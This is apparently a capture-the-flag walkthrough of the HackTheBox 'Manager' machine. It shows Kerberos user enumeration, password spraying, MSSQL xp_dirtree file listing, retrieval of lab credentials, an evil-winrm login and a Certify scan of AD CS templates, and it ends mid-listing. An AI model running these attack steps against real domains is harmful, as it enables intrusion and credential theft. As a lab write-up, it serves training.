# Manager

## Enumeration

### Nmap

```bash
nmap -A -p- -v -sC manager.htb
```

{% code overflow="wrap" %}
```
Nmap scan report for manager.htb (10.10.11.236)
Host is up (0.051s latency).
Not shown: 65513 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Manager
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-27 23:10:29Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_ssl-date: 2024-01-27T23:12:04+00:00; +6h59m58s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-27T23:12:04+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
|_ssl-date: 2024-01-27T23:12:04+00:00; +6h59m58s from scanner time.
| ms-sql-ntlm-info: 
|   10.10.11.236:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.10.11.236:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-01-27T17:32:53
| Not valid after:  2054-01-27T17:32:53
| MD5:   a3fc:e7f8:048c:fabf:6eb7:212c:d24f:5c29
|_SHA-1: c7b4:13dd:ac31:034c:087b:cd34:49c9:79da:cb9a:d41b
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-01-27T23:12:04+00:00; +6h59m58s from scanner time.
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc01.manager.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-07-30T13:51:28
| Not valid after:  2024-07-29T13:51:28
| MD5:   8f4d:67bc:2117:e4d5:43e9:76bd:1212:b562
|_SHA-1: 6779:9506:0167:b030:ce92:6a31:f81c:0800:1c0e:29fb
|_ssl-date: 2024-01-27T23:12:04+00:00; +6h59m58s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49673/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  msrpc         Microsoft Windows RPC
49705/tcp open  msrpc         Microsoft Windows RPC
49735/tcp open  msrpc         Microsoft Windows RPC
52758/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019 (89%)
Aggressive OS guesses: Microsoft Windows Server 2019 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-01-27T23:11:25
|_  start_date: N/A
|_clock-skew: mean: 6h59m57s, deviation: 0s, median: 6h59m57s

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   51.41 ms 10.10.14.1
2   51.70 ms manager.htb (10.10.11.236)

NSE: Script Post-scanning.
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Initiating NSE at 11:12
Completed NSE at 11:12, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 232.23 seconds
           Raw packets sent: 131228 (5.778MB) | Rcvd: 1240 (279.462KB)

```
{% endcode %}

### Port 53

<figure><img src="../../.gitbook/assets/image (306).png" alt=""><figcaption></figcaption></figure>

### Port 80

<figure><img src="../../.gitbook/assets/image (309).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (308).png" alt=""><figcaption></figcaption></figure>

### Port 88

Try to enumerate some possible usernames against Kerberos service:

{% code overflow="wrap" %}
```bash
kerbrute userenum /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt --dc dc01.manager.htb -d manager.htb 
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (310).png" alt=""><figcaption></figcaption></figure>

Save usernames to a file `users.txt`

### Port 445

Confirm version of SMB service:

<figure><img src="../../.gitbook/assets/image (311).png" alt=""><figcaption></figcaption></figure>

Try anonymous access with crackmapexec:

```bash
crackmapexec smb manager.htb -u 'anonymous' -p ''
```

```bash
smbclient -L \\\\manager.htb\\
```

<figure><img src="../../.gitbook/assets/image (313).png" alt=""><figcaption></figcaption></figure>

Try to access SMB shares using usernames enumarated before (as password we can use the same file with usernames):

<figure><img src="../../.gitbook/assets/image (314).png" alt=""><figcaption></figcaption></figure>

`operator:operator` is a good username and password to signin in SMB share:

Enumerate folder and files to which we have access with these credentials:

```bash
smbmap -u "operator" -p "operator" -H manager.htb 
```

<figure><img src="../../.gitbook/assets/image (315).png" alt=""><figcaption></figcaption></figure>

Traverse the directory SYSVOL and go inside manager.htb directory:

```bash
smbmap -u "operator" -p "operator" -r SYSVOL -H manager.htb 
```

<figure><img src="../../.gitbook/assets/image (316).png" alt=""><figcaption></figcaption></figure>

Access the SYSVOL share:

```bash
smbclient //10.10.11.236/SYSVOL -U operator%operator
```

But there is nothing of interest:

<figure><img src="../../.gitbook/assets/image (317).png" alt=""><figcaption></figcaption></figure>

### Port 1433

Microsoft SQL Server 2019 15.00.2000.00;

Service pack level: RTM

Try to login using `operator:operator` credentials and plain SQL Server authentication method:

```bash
mssqlclient.py manager.htb/operator:operator@10.10.11.236 -port 1433 
```

<figure><img src="../../.gitbook/assets/image (318).png" alt=""><figcaption></figcaption></figure>

Instead using Windows integrated authentication it works:

```bash
mssqlclient.py manager.htb/operator:operator@10.10.11.236 -port 1433 -window 
```

<figure><img src="../../.gitbook/assets/image (320).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Windows Authentication in MSSQL is a method of authentication where users are authenticated using their Windows credentials. This means that users can access MSSQL databases using the same username and password they use to log in to their Windows accounts. It provides a seamless and secure way to authenticate users without requiring separate database credentials.
{% endhint %}

We can try to spawn a shell using stored procedure of MSSQL Server.

{% hint style="danger" %}


Note that in order to be able to execute commands it's not only necessary to hav&#x65;**`xp_cmdshell`** **enabled**, but also have the **EXECUTE permission on the `xp_cmdshell` stored procedure**.&#x20;

You can get who (except sysadmins) can use **`xp_cmdshell`** with:

```sql
Use master
EXEC sp_helprotect 'xp_cmdshell'
```
{% endhint %}

In this case we don't have permission to execute `xp_cmdshell`:

<figure><img src="../../.gitbook/assets/image (321).png" alt=""><figcaption></figcaption></figure>

You can check if who (apart sysadmins) has permissions to run those MSSQL functions with:

```sql
EXEC sp_helprotect 'xp_dirtree';
EXEC sp_helprotect 'xp_subdirs';
EXEC sp_helprotect 'xp_fileexist';
```

<figure><img src="../../.gitbook/assets/image (322).png" alt=""><figcaption></figcaption></figure>

We can list the files and directories on Domain Controller:

```sql
EXEC master.sys.xp_dirtree 'C:\',1,1;
```

<figure><img src="../../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

The web.config file is not viewable instead we can download the zip file and extracting it we can finding a valuable XML with possible credentials:

```bash
wget http://manager.htb/website-backup-27-07-23-old.zip
```

<figure><img src="../../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

### Info

Domain AD:

* dc01.manager.htb
* NetBIOS\_Domain\_Name: MANAGER
* Microsoft Windows Server 2019

Port 80:

* IIS 10.0
* Potentially risky methods: TRACE

Port 88/445:

* `operator:operator`
* `raven:R4v3nBe5tD3veloP3r!123`

## Privilege Escalation

Try to connect using psexec.py or wmiexec.py not work.

Using evil-winrm trough port 5985 work and user flag  can be grabbed from Desktop:

```bash
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

<figure><img src="../../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

### Enumeration&#x20;

Using `WinPEAS.exe` we cannot obtain any relevant result.

Using `Certify.exe` we can retrieve some vulnerabilities on AD CS for example misconfigured templates:

```
.\Certify.exe find /vulnarable
```

<figure><img src="../../.gitbook/assets/image (328).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```bash

   _____          _   _  __
  / ____|        | | (_)/ _|
 | |     ___ _ __| |_ _| |_ _   _
 | |    / _ \ '__| __| |  _| | | |
 | |___|  __/ |  | |_| | | | |_| |
  \_____\___|_|   \__|_|_|  \__, |
                             __/ |
                            |___./
  v1.1.0

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=manager,DC=htb'

[*] Listing info about the Enterprise CA 'manager-DC01-CA'

    Enterprise CA Name            : manager-DC01-CA
    DNS Hostname                  : dc01.manager.htb
    FullName                      : dc01.manager.htb\manager-DC01-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=manager-DC01-CA, DC=manager, DC=htb
    Cert Thumbprint               : ACE850A2892B1614526F7F2151EE76E752415023
    Cert Serial                   : 5150CE6EC048749448C7390A52F264BB
    Cert Start Date               : 7/27/2023 3:21:05 AM
    Cert End Date                 : 7/27/2122 3:31:04 AM
    Cert Chain                    : CN=manager-DC01-CA,DC=manager,DC=htb
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Deny   ManageCA, Read                             MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
      Allow  ManageCA, ManageCertificates               MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Allow  ManageCA, Enroll                           MANAGER\Raven                 S-1-5-21-4078382237-1492182817-2568127209-1116
      Allow  Enroll                                     MANAGER\Operator              S-1-5-21-4078382237-1492182817-2568127209-1119
    Enrollment Agent Restrictions : None

[*] Available Certificates Templates :

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : User
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Domain Users          S-1-5-21-4078382237-1492182817-2568127209-513
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : EFS
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Encrypting File System
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Domain Users          S-1-5-21-4078382237-1492182817-2568127209-513
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : Administrator
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_ALT_REQUIRE_EMAIL, SUBJECT_REQUIRE_EMAIL, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Encrypting File System, Microsoft Trust List Signing, Secure Email
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : EFSRecovery
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_UPN, SUBJECT_REQUIRE_DIRECTORY_PATH
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : File Recovery
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : Machine
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Domain Computers      S-1-5-21-4078382237-1492182817-2568127209-515
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : DomainController
    Schema Version                        : 1
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS, SUBJECT_REQUIRE_DNS_AS_CN
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Domain Controllers    S-1-5-21-4078382237-1492182817-2568127209-516
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
                                      MANAGER\Enterprise Read-only Domain ControllersS-1-5-21-4078382237-1492182817-2568127209-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : WebServer
    Schema Version                        : 1
    Validity Period                       : 2 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Server Authentication
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : SubCA
    Schema Version                        : 1
    Validity Period                       : 5 years
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : <null>
    mspki-certificate-application-policy  : <null>
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : DomainControllerAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Domain Controllers    S-1-5-21-4078382237-1492182817-2568127209-516
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
                                      MANAGER\Enterprise Read-only Domain ControllersS-1-5-21-4078382237-1492182817-2568127209-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : DirectoryEmailReplication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DIRECTORY_GUID, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS, AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Directory Service Email Replication
    mspki-certificate-application-policy  : Directory Service Email Replication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Domain Controllers    S-1-5-21-4078382237-1492182817-2568127209-516
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
                                      MANAGER\Enterprise Read-only Domain ControllersS-1-5-21-4078382237-1492182817-2568127209-498
                                      NT AUTHORITY\ENTERPRISE DOMAIN CONTROLLERSS-1-5-9
      Object Control Permissions
        Owner                       : MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteOwner Principals       : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteDacl Principals        : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519
        WriteProperty Principals    : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
                                      MANAGER\Enterprise Admins     S-1-5-21-4078382237-1492182817-2568127209-519

    CA Name                               : dc01.manager.htb\manager-DC01-CA
    Template Name                         : KerberosAuthentication
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : SUBJECT_ALT_REQUIRE_DOMAIN_DNS, SUBJECT_ALT_REQUIRE_DNS
    mspki-enrollment-flag                 : AUTO_ENROLLMENT
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    mspki-certificate-application-policy  : Client Authentication, KDC Authentication, Server Authentication, Smart Card Logon
    Permissions
      Enrollment Permissions
        Enrollment Rights           : MANAGER\Domain Admins         S-1-5-21-4078382237-1492182817-2568127209-512
